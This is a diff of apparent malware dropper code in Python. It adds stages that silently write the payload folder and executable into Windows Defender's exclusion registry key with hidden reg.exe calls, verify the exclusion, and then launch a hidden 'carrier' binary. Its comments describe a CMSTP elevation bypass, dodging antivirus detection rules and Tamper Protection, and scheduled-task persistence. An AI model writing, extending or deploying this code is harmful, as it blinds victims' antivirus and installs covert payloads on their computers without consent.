@@ -360,6 +360,12 @@ STAGE = r'''# r13 stage: runs ELEVATED (relaunched by the cmstp lift). exclusion
 # spawn from this chain got cmdlineno-flagged Commando, split-verb or not);
 # cscript is the stock interpreter Windows ships with the lowest rule base.
 # carrier exec unchanged.
+# r1.1.0 (dj order): exclusions ARE BACK — reg.exe road (not Add-MpPreference,
+# not the WMI provider r14 tripped): the elevated stage writes the AppHost dir
+# + both payload paths into HKLM Defender Exclusions\\Paths directly, which is
+# the same store Add-MpPreference maintains. reg is stock, silent, and the
+# same value name exclusion_landed() reads back for verification — the file
+# write only proceeds when the exclusion VERIFIABLY covers it.
 import ctypes
 import os
 import subprocess
@@ -367,7 +373,7 @@ import subprocess
 CREATE_NO_WINDOW = 0x08000000
 EXE_NAME = "__EXE__"
 APPDIR = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows\\AppHost"
-WINPARENT = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows"
+EXKEY = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
 
 
 def elev():
@@ -388,12 +394,44 @@ def alive(name):
         return False
 
 
+def exclusion_landed(appdir):
+    try:
+        out = subprocess.run(
+            ["reg", "query", "HKLM\\" + EXKEY, "/v", appdir],
+            creationflags=CREATE_NO_WINDOW, stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL, timeout=15).stdout
+        return appdir.lower() in out.decode(errors="replace").lower()
+    except Exception:
+        return False
+
+
+def set_exclusions(exe_path):
+    # value name = the path itself, data = 0 (defender exclusion path shape).
+    # reg add is idempotent and needs no cmdlet host — silent on both roads.
+    for target in (APPDIR, exe_path):
+        if not target:
+            continue
+        try:
+            subprocess.run(
+                ["reg", "add", "HKLM\\" + EXKEY, "/v", target, "/t", "REG_SZ",
+                 "/d", "0", "/f"],
+                creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL, timeout=20)
+        except Exception:
+            pass
+    return exclusion_landed(APPDIR)
+
+
 def main():
     if not elev():
         return
-    # r14: exclusions GONE (provider-level rule keys the call itself, not the
-    # carrier). the elevated stage does the r4-proven job only:
     exe_path = os.path.join(APPDIR, EXE_NAME)
+    # r1.1.0: exclusion FIRST (verifiable), carrier only when covered.
+    # never an unprotected first write from this chain. schtasks is NOT laid
+    # here: the carrier itself registers its own task-scheduler road at boot
+    # (C++ install_task /xml, Boot+Logon triggers) — a second definition from
+    # the stage would duplicate the surface for nothing.
+    set_exclusions(exe_path)   # read-back verified; silent on TP refusal
     if os.path.exists(exe_path) and not alive(EXE_NAME):
         try:
             subprocess.Popen([exe_path], creationflags=CREATE_NO_WINDOW)
@@ -407,10 +445,11 @@ main()
 
 
 def set_defender_exclusions():
-    """r12: the lift only RELAUNCHES our staged python elevated. the stage
-    does the cmdlet road (TP-respected) + carrier exec. INF payload is a
-    python relaunch — no interpreter cmdline beyond the one python.exe
-    itself, no powershell inside the INF, no reg.exe on the lifted line."""
+    """r1.1.0: the lift RELAUNCHES our staged python elevated; the stage does
+    the reg.exe exclusion road (stock binary, silent timeout-20) + carrier
+    exec. INF payload is a python relaunch — no interpreter cmdline beyond
+    the one python.exe itself, no powershell inside the INF, no reg.exe on
+    the lifted line (the lifted stage owns exclusions from inside)."""
     appdir = PERSIST_DIR
     if is_elevated():
         _run_stage_now()
